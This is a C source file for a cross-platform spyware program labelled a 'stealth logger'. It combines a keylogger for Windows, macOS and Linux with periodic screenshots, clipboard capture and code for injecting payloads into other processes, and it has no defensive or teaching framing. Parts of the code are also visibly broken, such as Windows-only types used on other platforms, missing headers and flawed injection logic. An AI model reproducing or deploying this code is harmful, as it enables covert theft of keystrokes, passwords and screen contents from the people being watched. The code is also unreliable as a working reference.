#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

// Platform detection
#ifdef _WIN32
#include <windows.h>
#include <winuser.h>
#include <tlhelp32.h>
#define PLATFORM "Windows"
#elif __APPLE__
#include <CoreGraphics/CoreGraphics.h>
#include <AppKit/AppKit.h>
#define PLATFORM "macOS"
#elif __linux__
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <syscall.h>
#define PLATFORM "Linux"
#endif

// stb_image_write for screenshot compression
#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "stb_image_write.h"

// Configuration
#define LOG_FILE "stealth.log"
#define SCREENSHOT_INTERVAL 300 // 5 minutes
#define CLIPBOARD_INTERVAL 60   // 1 minute
#define MAX_LOG_SIZE 1024 * 1024 // 1MB

// Global variables
HHOOK hKeyboardHook = NULL;
FILE* log_file = NULL;
int screenshot_count = 0;

// Logging function
void log_message(const char* format, ...) {
    if (!log_file) {
        log_file = fopen(LOG_FILE, "a");
        if (!log_file) return;
    }

    time_t now = time(NULL);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));

    va_list args;
    va_start(args, format);
    fprintf(log_file, "[%s] ", timestamp);
    vfprintf(log_file, format, args);
    fprintf(log_file, "\n");
    va_end(args);

    fflush(log_file);

    // Check log size
    fseek(log_file, 0, SEEK_END);
    if (ftell(log_file) > MAX_LOG_SIZE) {
        fclose(log_file);
        char backup_name[256];
        snprintf(backup_name, sizeof(backup_name), "%s.%d", LOG_FILE, (int)time(NULL));
        rename(LOG_FILE, backup_name);
        log_file = fopen(LOG_FILE, "a");
    }
}

// Keylogger implementation
#ifdef _WIN32
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        char key[256] = {0};

        if (GetKeyState(VK_SHIFT) & 0x8000) {
            GetKeyNameTextA(lParam, key, sizeof(key));
        } else {
            UINT scanCode = pKeyBoard->scanCode;
            BYTE keyState[256];
            GetKeyboardState(keyState);
            ToAscii(scanCode, pKeyBoard->vkCode, keyState, (LPWORD)key, 0);
        }

        if (strlen(key) > 0) {
            log_message("KEYLOG: %s", key);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void start_keylogger() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hKeyboardHook == NULL) {
        log_message("Failed to set keyboard hook");
        return;
    }
    log_message("Keylogger started");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
#elif __APPLE__
CGEventRef tapCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        char key[256] = {0};

        // Simple key mapping (needs expansion)
        switch (keyCode) {
            case 0: strcpy(key, "a"); break;
            case 1: strcpy(key, "s"); break;
            case 2: strcpy(key, "d"); break;
            case 3: strcpy(key, "f"); break;
            case 4: strcpy(key, "h"); break;
            case 5: strcpy(key, "g"); break;
            case 6: strcpy(key, "z"); break;
            case 7: strcpy(key, "x"); break;
            case 8: strcpy(key, "c"); break;
            case 9: strcpy(key, "v"); break;
            default: snprintf(key, sizeof(key), "0x%X", keyCode);
        }

        log_message("KEYLOG: %s", key);
    }
    return event;
}

void start_keylogger() {
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        CGEventMaskBit(kCGEventKeyDown),
        tapCallback,
        NULL
    );

    if (!eventTap) {
        log_message("Failed to create event tap");
        return;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    log_message("Keylogger started");

    CFRunLoopRun();
}
#elif __linux__
void start_keylogger() {
    const char* device = "/dev/input/event0";
    int fd = open(device, O_RDONLY);
    if (fd == -1) {
        log_message("Failed to open input device: %s", device);
        return;
    }

    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
        if (ev.type == EV_KEY && ev.value == 1) {
            char key[256] = {0};
            snprintf(key, sizeof(key), "0x%X", ev.code);
            log_message("KEYLOG: %s", key);
        }
    }
    close(fd);
}
#endif

// Screenshot implementation
void take_screenshot() {
#ifdef _WIN32
    HWND desktop = GetDesktopWindow();
    HDC desktopDC = GetDC(desktop);
    HDC memoryDC = CreateCompatibleDC(desktopDC);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP bitmap = CreateCompatibleBitmap(desktopDC, width, height);
    HBITMAP oldBitmap = (HBITMAP)SelectObject(memoryDC, bitmap);

    BitBlt(memoryDC, 0, 0, width, height, desktopDC, 0, 0, SRCCOPY);
    bitmap = (HBITMAP)SelectObject(memoryDC, oldBitmap);

    // Convert to RGB
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(bmi.bmiHeader);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height; // Top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    char* pixels = (char*)malloc(width * height * 3);
    GetDIBits(desktopDC, bitmap, 0, height, pixels, &bmi, DIB_RGB_COLORS);

    // Save as PNG
    char filename[256];
    snprintf(filename, sizeof(filename), "screenshot_%d.png", screenshot_count++);
    stbi_write_png(filename, width, height, 3, pixels, width * 3);

    free(pixels);
    DeleteObject(bitmap);
    DeleteDC(memoryDC);
    ReleaseDC(desktop, desktopDC);
#elif __APPLE__
    CGImageRef screenshot = CGDisplayCreateImage(kCGDirectMainDisplay);
    if (!screenshot) {
        log_message("Failed to capture screenshot");
        return;
    }

    size_t width = CGImageGetWidth(screenshot);
    size_t height = CGImageGetHeight(screenshot);
    size_t bytesPerRow = CGImageGetBytesPerRow(screenshot);

    char* pixels = (char*)malloc(height * bytesPerRow);
    CGContextRef context = CGBitmapContextCreate(
        pixels,
        width,
        height,
        8,
        bytesPerRow,
        CGImageGetColorSpace(screenshot),
        kCGImageAlphaNoneSkipFirst
    );

    CGContextDrawImage(context, CGRectMake(0, 0, width, height), screenshot);
    CGImageRelease(screenshot);
    CGContextRelease(context);

    // Save as PNG
    char filename[256];
    snprintf(filename, sizeof(filename), "screenshot_%d.png", screenshot_count++);
    stbi_write_png(filename, width, height, 4, pixels, bytesPerRow);

    free(pixels);
#elif __linux__
    // Use scrot or import command for simplicity
    char filename[256];
    snprintf(filename, sizeof(filename), "screenshot_%d.png", screenshot_count++);
    char command[512];
    snprintf(command, sizeof(command), "import -window root %s", filename);
    system(command);
#endif
    log_message("Screenshot saved: %s", filename);
}

void screenshot_thread() {
    while (1) {
        take_screenshot();
        sleep(SCREENSHOT_INTERVAL);
    }
}

// Clipboard monitoring
void monitor_clipboard() {
#ifdef _WIN32
    while (1) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData != NULL) {
                char* clipboardText = (char*)GlobalLock(hData);
                if (clipboardText != NULL) {
                    log_message("CLIPBOARD: %s", clipboardText);
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
        sleep(CLIPBOARD_INTERVAL);
    }
#elif __APPLE__
    while (1) {
        NSPasteboard* pasteboard = [NSPasteboard generalPasteboard];
        NSArray* types = [pasteboard types];
        if ([types containsObject:NSPasteboardTypeString]) {
            NSString* text = [pasteboard stringForType:NSPasteboardTypeString];
            if (text != nil) {
                log_message("CLIPBOARD: %s", [text UTF8String]);
            }
        }
        sleep(CLIPBOARD_INTERVAL);
    }
#elif __linux__
    while (1) {
        char command[512];
        snprintf(command, sizeof(command), "xclip -selection clipboard -o 2>/dev/null | head -100");
        FILE* pipe = popen(command, "r");
        if (pipe) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                log_message("CLIPBOARD: %s", buffer);
            }
            pclose(pipe);
        }
        sleep(CLIPBOARD_INTERVAL);
    }
#endif
}

// Process injection
#ifdef _WIN32
BOOL inject_payload(DWORD pid, const char* payloadPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        log_message("Failed to open process: %d", pid);
        return FALSE;
    }

    SIZE_T payloadSize = GetFileSize(GetModuleHandle(NULL), NULL);
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMem == NULL) {
        log_message("Failed to allocate remote memory");
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, payloadPath, payloadSize, NULL)) {
        log_message("Failed to write to remote memory");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (hThread == NULL) {
        log_message("Failed to create remote thread");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    log_message("Payload injected into process: %d", pid);
    return TRUE;
}
#elif __linux__
BOOL inject_payload(pid_t pid, const char* payloadPath) {
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        log_message("Failed to attach to process: %d", pid);
        return FALSE;
    }

    waitpid(pid, NULL, 0);

    // Read registers
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
        log_message("Failed to get registers");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return FALSE;
    }

    // Allocate memory in target process
    regs.rax = SYS_mmap;
    regs.rdi = 0; // addr
    regs.rsi = 4096; // length
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC; // prot
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS; // flags
    regs.r8 = -1; // fd
    regs.r9 = 0; // offset

    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
        log_message("Failed to execute mmap syscall");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return FALSE;
    }

    waitpid(pid, NULL, 0);
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    void* remoteMem = (void*)regs.rax;

    // Write payload to remote memory
    FILE* payloadFile = fopen(payloadPath, "rb");
    if (!payloadFile) {
        log_message("Failed to open payload file");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return FALSE;
    }

    char buffer[4096];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), payloadFile)) > 0) {
        for (size_t i = 0; i < bytesRead; i += 8) {
            uint64_t data = *(uint64_t*)(buffer + i);
            if (ptrace(PTRACE_POKEDATA, pid, remoteMem + i, data) == -1) {
                log_message("Failed to write to remote memory");
                fclose(payloadFile);
                ptrace(PTRACE_DETACH, pid, NULL, NULL);
                return FALSE;
            }
        }
    }
    fclose(payloadFile);

    // Jump to payload
    regs.rip = (uint64_t)remoteMem;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
        log_message("Failed to set registers");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return FALSE;
    }

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        log_message("Failed to detach from process");
        return FALSE;
    }

    log_message("Payload injected into process: %d", pid);
    return TRUE;
}
#endif

int main() {
    log_message("Stealth logger started on %s", PLATFORM);

    // Start keylogger in separate thread
    pthread_t keyloggerThread;
    pthread_create(&keyloggerThread, NULL, (void*)start_keylogger, NULL);

    // Start screenshot thread
    pthread_t screenshotThread;
    pthread_create(&screenshotThread, NULL, (void*)screenshot_thread, NULL);

    // Start clipboard monitoring thread
    pthread_t clipboardThread;
    pthread_create(&clipboardThread, NULL, (void*)monitor_clipboard, NULL);

    // Wait for threads to finish (they won't)
    pthread_join(keyloggerThread, NULL);
    pthread_join(screenshotThread, NULL);
    pthread_join(clipboardThread, NULL);

    if (log_file) {
        fclose(log_file);
    }

    return 0;
}
